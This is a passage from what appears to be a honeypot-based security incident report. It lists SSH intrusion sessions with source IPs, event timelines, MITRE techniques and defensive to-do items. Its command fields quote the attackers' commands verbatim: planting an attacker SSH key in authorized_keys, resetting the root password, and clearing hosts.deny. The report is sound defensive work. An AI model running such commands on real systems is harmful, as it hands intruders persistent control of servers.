| `2026-05-28 13:24:30` | `cowrie.command.input` |
| `2026-05-28 13:24:30` | `cowrie.log.closed` |
| `2026-05-28 13:24:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.53.244[.]204` to AbuseIPDB if not already reported
- [ ] Block `120.53.244[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-171942ab8a1c

| Field | Detail |
|---|---|
| **Source IP** | `49.72.212[.]22` |
| **First Seen** | 2026-05-28 13:30 |
| **Last Seen** | 2026-05-28 13:31 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:z5qB4kuBnlMm"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 13:30:54` | `cowrie.session.connect` |
| `2026-05-28 13:30:55` | `cowrie.client.version` |
| `2026-05-28 13:30:56` | `cowrie.client.kex` |
| `2026-05-28 13:30:58` | `cowrie.login.success` |
| `2026-05-28 13:30:59` | `cowrie.session.params` |
| `2026-05-28 13:30:59` | `cowrie.command.input` |
| `2026-05-28 13:30:59` | `cowrie.command.failed` |
| `2026-05-28 13:31:00` | `cowrie.log.closed` |
| `2026-05-28 13:31:00` | `cowrie.session.params` |
| `2026-05-28 13:31:00` | `cowrie.command.input` |
| `2026-05-28 13:31:00` | `cowrie.session.file_download` |
| `2026-05-28 13:31:00` | `cowrie.log.closed` |
| `2026-05-28 13:31:17` | `cowrie.session.params` |
| `2026-05-28 13:31:17` | `cowrie.command.input` |
| `2026-05-28 13:31:17` | `cowrie.log.closed` |
| `2026-05-28 13:31:17` | `cowrie.session.params` |
| `2026-05-28 13:31:17` | `cowrie.command.input` |
| `2026-05-28 13:31:17` | `cowrie.log.closed` |
| `2026-05-28 13:31:18` | `cowrie.session.params` |
| `2026-05-28 13:31:18` | `cowrie.command.input` |
| `2026-05-28 13:31:18` | `cowrie.session.file_download` |
| `2026-05-28 13:31:18` | `cowrie.log.closed` |
| `2026-05-28 13:31:18` | `cowrie.session.params` |
| `2026-05-28 13:31:18` | `cowrie.command.input` |
| `2026-05-28 13:31:18` | `cowrie.log.closed` |
| `2026-05-28 13:31:19` | `cowrie.session.params` |
| `2026-05-28 13:31:19` | `cowrie.command.input` |
| `2026-05-28 13:31:19` | `cowrie.log.closed` |
| `2026-05-28 13:31:19` | `cowrie.session.params` |
| `2026-05-28 13:31:19` | `cowrie.command.input` |
| `2026-05-28 13:31:19` | `cowrie.command.input` |
| `2026-05-28 13:31:19` | `cowrie.log.closed` |
| `2026-05-28 13:31:20` | `cowrie.session.params` |
| `2026-05-28 13:31:20` | `cowrie.command.input` |
| `2026-05-28 13:31:20` | `cowrie.log.closed` |
| `2026-05-28 13:31:20` | `cowrie.session.params` |
| `2026-05-28 13:31:20` | `cowrie.command.input` |
| `2026-05-28 13:31:20` | `cowrie.log.closed` |
| `2026-05-28 13:31:21` | `cowrie.session.params` |
| `2026-05-28 13:31:21` | `cowrie.command.input` |
| `2026-05-28 13:31:21` | `cowrie.log.closed` |
| `2026-05-28 13:31:21` | `cowrie.session.params` |
| `2026-05-28 13:31:21` | `cowrie.command.input` |
| `2026-05-28 13:31:21` | `cowrie.log.closed` |
| `2026-05-28 13:31:22` | `cowrie.session.params` |
| `2026-05-28 13:31:22` | `cowrie.command.input` |
| `2026-05-28 13:31:22` | `cowrie.log.closed` |
| `2026-05-28 13:31:22` | `cowrie.session.params` |
| `2026-05-28 13:31:22` | `cowrie.command.input` |
| `2026-05-28 13:31:22` | `cowrie.log.closed` |
| `2026-05-28 13:31:23` | `cowrie.session.params` |
| `2026-05-28 13:31:23` | `cowrie.command.input` |
| `2026-05-28 13:31:23` | `cowrie.log.closed` |
| `2026-05-28 13:31:23` | `cowrie.session.params` |
| `2026-05-28 13:31:23` | `cowrie.command.input` |
| `2026-05-28 13:31:23` | `cowrie.log.closed` |
| `2026-05-28 13:31:24` | `cowrie.session.params` |
| `2026-05-28 13:31:24` | `cowrie.command.input` |
| `2026-05-28 13:31:24` | `cowrie.log.closed` |
| `2026-05-28 13:31:24` | `cowrie.session.params` |
| `2026-05-28 13:31:24` | `cowrie.command.input` |
| `2026-05-28 13:31:24` | `cowrie.log.closed` |
| `2026-05-28 13:31:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.72.212[.]22` to AbuseIPDB if not already reported
- [ ] Block `49.72.212[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c0bf5a733a3

| Field | Detail |
|---|---|
| **Source IP** | `120.53.244[.]204` |
| **First Seen** | 2026-05-28 13:31 |
| **Last Seen** | 2026-05-28 13:31 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:p5u9bV7oUNUB"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 13:31:32` | `cowrie.session.connect` |
| `2026-05-28 13:31:32` | `cowrie.client.version` |
| `2026-05-28 13:31:32` | `cowrie.client.kex` |
| `2026-05-28 13:31:33` | `cowrie.login.success` |
| `2026-05-28 13:31:33` | `cowrie.session.params` |
| `2026-05-28 13:31:33` | `cowrie.command.input` |
| `2026-05-28 13:31:33` | `cowrie.command.failed` |
| `2026-05-28 13:31:33` | `cowrie.log.closed` |
| `2026-05-28 13:31:34` | `cowrie.session.params` |
| `2026-05-28 13:31:34` | `cowrie.command.input` |
| `2026-05-28 13:31:34` | `cowrie.session.file_download` |
| `2026-05-28 13:31:34` | `cowrie.log.closed` |
| `2026-05-28 13:31:50` | `cowrie.session.params` |
| `2026-05-28 13:31:50` | `cowrie.command.input` |
| `2026-05-28 13:31:50` | `cowrie.log.closed` |
| `2026-05-28 13:31:50` | `cowrie.session.params` |
| `2026-05-28 13:31:50` | `cowrie.command.input` |
| `2026-05-28 13:31:51` | `cowrie.log.closed` |
| `2026-05-28 13:31:51` | `cowrie.session.params` |
| `2026-05-28 13:31:51` | `cowrie.command.input` |
| `2026-05-28 13:31:51` | `cowrie.session.file_download` |
| `2026-05-28 13:31:51` | `cowrie.log.closed` |
| `2026-05-28 13:31:51` | `cowrie.session.params` |
| `2026-05-28 13:31:51` | `cowrie.command.input` |
| `2026-05-28 13:31:52` | `cowrie.log.closed` |
| `2026-05-28 13:31:52` | `cowrie.session.params` |
| `2026-05-28 13:31:52` | `cowrie.command.input` |
| `2026-05-28 13:31:52` | `cowrie.log.closed` |
| `2026-05-28 13:31:52` | `cowrie.session.params` |
| `2026-05-28 13:31:52` | `cowrie.command.input` |
| `2026-05-28 13:31:52` | `cowrie.command.input` |
| `2026-05-28 13:31:53` | `cowrie.log.closed` |
| `2026-05-28 13:31:53` | `cowrie.session.params` |
| `2026-05-28 13:31:53` | `cowrie.command.input` |
| `2026-05-28 13:31:53` | `cowrie.log.closed` |
| `2026-05-28 13:31:53` | `cowrie.session.params` |
| `2026-05-28 13:31:53` | `cowrie.command.input` |
| `2026-05-28 13:31:54` | `cowrie.log.closed` |
| `2026-05-28 13:31:54` | `cowrie.session.params` |
| `2026-05-28 13:31:54` | `cowrie.command.input` |
| `2026-05-28 13:31:54` | `cowrie.log.closed` |
| `2026-05-28 13:31:54` | `cowrie.session.params` |
| `2026-05-28 13:31:54` | `cowrie.command.input` |
| `2026-05-28 13:31:55` | `cowrie.log.closed` |
| `2026-05-28 13:31:55` | `cowrie.session.params` |
| `2026-05-28 13:31:55` | `cowrie.command.input` |
| `2026-05-28 13:31:55` | `cowrie.log.closed` |
| `2026-05-28 13:31:55` | `cowrie.session.params` |
| `2026-05-28 13:31:55` | `cowrie.command.input` |
| `2026-05-28 13:31:56` | `cowrie.log.closed` |
| `2026-05-28 13:31:56` | `cowrie.session.params` |
| `2026-05-28 13:31:56` | `cowrie.command.input` |
| `2026-05-28 13:31:56` | `cowrie.log.closed` |
| `2026-05-28 13:31:56` | `cowrie.session.params` |
| `2026-05-28 13:31:56` | `cowrie.command.input` |
| `2026-05-28 13:31:57` | `cowrie.log.closed` |
| `2026-05-28 13:31:57` | `cowrie.session.params` |
| `2026-05-28 13:31:57` | `cowrie.command.input` |
| `2026-05-28 13:31:57` | `cowrie.log.closed` |
| `2026-05-28 13:31:57` | `cowrie.session.params` |
| `2026-05-28 13:31:57` | `cowrie.command.input` |
| `2026-05-28 13:31:57` | `cowrie.log.closed` |
| `2026-05-28 13:31:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.53.244[.]204` to AbuseIPDB if not already reported
- [ ] Block `120.53.244[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2c405973d4c

| Field | Detail |
|---|---|
| **Source IP** | `101.47.156[.]21` |
| **First Seen** | 2026-05-28 13:41 |
| **Last Seen** | 2026-05-28 13:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 13:41:13` | `cowrie.session.connect` |
| `2026-05-28 13:41:13` | `cowrie.client.version` |
| `2026-05-28 13:41:13` | `cowrie.client.kex` |
| `2026-05-28 13:41:14` | `cowrie.login.success` |
| `2026-05-28 13:41:14` | `cowrie.session.params` |
| `2026-05-28 13:41:14` | `cowrie.command.input` |
| `2026-05-28 13:41:14` | `cowrie.command.failed` |
| `2026-05-28 13:41:14` | `cowrie.log.closed` |
| `2026-05-28 13:41:14` | `cowrie.session.params` |
| `2026-05-28 13:41:14` | `cowrie.command.input` |
| `2026-05-28 13:41:14` | `cowrie.session.file_download` |
| `2026-05-28 13:41:14` | `cowrie.log.closed` |
| `2026-05-28 13:41:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.156[.]21` to AbuseIPDB if not already reported
- [ ] Block `101.47.156[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba2f913080d9

| Field | Detail |
|---|---|
| **Source IP** | `101.47.156[.]21` |
| **First Seen** | 2026-05-28 13:41 |
| **Last Seen** | 2026-05-28 13:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 13:41:16` | `cowrie.session.connect` |
| `2026-05-28 13:41:16` | `cowrie.client.version` |
| `2026-05-28 13:41:16` | `cowrie.client.kex` |
| `2026-05-28 13:41:16` | `cowrie.login.success` |
| `2026-05-28 13:41:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.156[.]21` to AbuseIPDB if not already reported
- [ ] Block `101.47.156[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2a61dc573ed

| Field | Detail |
|---|---|
| **Source IP** | `179.184.242[.]48` |
| **First Seen** | 2026-05-28 13:46 |
| **Last Seen** | 2026-05-28 13:46 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 13:46:38` | `cowrie.session.connect` |
| `2026-05-28 13:46:38` | `cowrie.client.version` |
| `2026-05-28 13:46:38` | `cowrie.client.kex` |
| `2026-05-28 13:46:39` | `cowrie.login.success` |
| `2026-05-28 13:46:40` | `cowrie.session.params` |
| `2026-05-28 13:46:40` | `cowrie.command.input` |
| `2026-05-28 13:46:40` | `cowrie.command.failed` |
| `2026-05-28 13:46:40` | `cowrie.log.closed` |
| `2026-05-28 13:46:41` | `cowrie.session.params` |
| `2026-05-28 13:46:41` | `cowrie.command.input` |
| `2026-05-28 13:46:41` | `cowrie.session.file_download` |
| `2026-05-28 13:46:41` | `cowrie.log.closed` |
| `2026-05-28 13:46:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.242[.]48` to AbuseIPDB if not already reported
- [ ] Block `179.184.242[.]48` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2bc689f1216

| Field | Detail |
|---|---|
| **Source IP** | `179.184.242[.]48` |
| **First Seen** | 2026-05-28 13:46 |
| **Last Seen** | 2026-05-28 13:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 13:46:45` | `cowrie.session.connect` |
| `2026-05-28 13:46:45` | `cowrie.client.version` |
| `2026-05-28 13:46:45` | `cowrie.client.kex` |
| `2026-05-28 13:46:47` | `cowrie.login.success` |
| `2026-05-28 13:46:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.242[.]48` to AbuseIPDB if not already reported
- [ ] Block `179.184.242[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58ee71ab6767

| Field | Detail |
|---|---|
| **Source IP** | `179.184.242[.]48` |
| **First Seen** | 2026-05-28 13:49 |
| **Last Seen** | 2026-05-28 13:49 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 13:49:19` | `cowrie.session.connect` |
| `2026-05-28 13:49:19` | `cowrie.client.version` |
| `2026-05-28 13:49:20` | `cowrie.client.kex` |
| `2026-05-28 13:49:21` | `cowrie.login.success` |
| `2026-05-28 13:49:22` | `cowrie.session.params` |
| `2026-05-28 13:49:22` | `cowrie.command.input` |
| `2026-05-28 13:49:22` | `cowrie.command.failed` |
| `2026-05-28 13:49:22` | `cowrie.log.closed` |
| `2026-05-28 13:49:23` | `cowrie.session.params` |
| `2026-05-28 13:49:23` | `cowrie.command.input` |
| `2026-05-28 13:49:23` | `cowrie.session.file_download` |
| `2026-05-28 13:49:23` | `cowrie.log.closed` |
| `2026-05-28 13:49:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.242[.]48` to AbuseIPDB if not already reported
- [ ] Block `179.184.242[.]48` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4612a7ffb038

| Field | Detail |
|---|---|
| **Source IP** | `179.184.242[.]48` |
| **First Seen** | 2026-05-28 13:49 |
| **Last Seen** | 2026-05-28 13:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 13:49:27` | `cowrie.session.connect` |
| `2026-05-28 13:49:27` | `cowrie.client.version` |
| `2026-05-28 13:49:27` | `cowrie.client.kex` |
| `2026-05-28 13:49:28` | `cowrie.login.success` |
| `2026-05-28 13:49:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.242[.]48` to AbuseIPDB if not already reported
- [ ] Block `179.184.242[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-972c87f8d5e2

| Field | Detail |
|---|---|
| **Source IP** | `179.184.242[.]48` |
| **First Seen** | 2026-05-28 13:52 |
| **Last Seen** | 2026-05-28 13:52 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 13:52:01` | `cowrie.session.connect` |
| `2026-05-28 13:52:01` | `cowrie.client.version` |
| `2026-05-28 13:52:01` | `cowrie.client.kex` |
| `2026-05-28 13:52:02` | `cowrie.login.success` |
| `2026-05-28 13:52:03` | `cowrie.session.params` |
| `2026-05-28 13:52:03` | `cowrie.command.input` |
| `2026-05-28 13:52:03` | `cowrie.command.failed` |
| `2026-05-28 13:52:03` | `cowrie.log.closed` |
| `2026-05-28 13:52:04` | `cowrie.session.params` |
| `2026-05-28 13:52:04` | `cowrie.command.input` |
| `2026-05-28 13:52:04` | `cowrie.session.file_download` |
| `2026-05-28 13:52:04` | `cowrie.log.closed` |
| `2026-05-28 13:52:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.242[.]48` to AbuseIPDB if not already reported
- [ ] Block `179.184.242[.]48` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6239572fc4f

| Field | Detail |
|---|---|
| **Source IP** | `179.184.242[.]48` |
| **First Seen** | 2026-05-28 13:52 |
| **Last Seen** | 2026-05-28 13:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 13:52:08` | `cowrie.session.connect` |
| `2026-05-28 13:52:08` | `cowrie.client.version` |
| `2026-05-28 13:52:08` | `cowrie.client.kex` |
| `2026-05-28 13:52:10` | `cowrie.login.success` |
| `2026-05-28 13:52:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.242[.]48` to AbuseIPDB if not already reported
- [ ] Block `179.184.242[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b60e97d8096e

| Field | Detail |
|---|---|
| **Source IP** | `179.184.242[.]48` |
| **First Seen** | 2026-05-28 13:54 |
| **Last Seen** | 2026-05-28 13:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 13:54:51` | `cowrie.session.connect` |
| `2026-05-28 13:54:51` | `cowrie.client.version` |
| `2026-05-28 13:54:52` | `cowrie.client.kex` |
| `2026-05-28 13:54:53` | `cowrie.login.success` |
| `2026-05-28 13:54:54` | `cowrie.session.params` |
| `2026-05-28 13:54:54` | `cowrie.command.input` |
| `2026-05-28 13:54:54` | `cowrie.command.failed` |
| `2026-05-28 13:54:54` | `cowrie.log.closed` |
| `2026-05-28 13:54:55` | `cowrie.session.params` |
| `2026-05-28 13:54:55` | `cowrie.command.input` |
| `2026-05-28 13:54:55` | `cowrie.session.file_download` |
| `2026-05-28 13:54:55` | `cowrie.log.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.242[.]48` to AbuseIPDB if not already reported
- [ ] Block `179.184.242[.]48` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `180.184.38[.]93` | **17** | 2026-05-28 10:48 | 2026-05-28 10:59 | 25m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `102.88.137[.]213` | **16** | 2026-05-28 10:53 | 2026-05-28 11:22 | 0m | 16 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `180.76.225[.]175` | **14** | 2026-05-28 10:54 | 2026-05-28 11:20 | 24m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
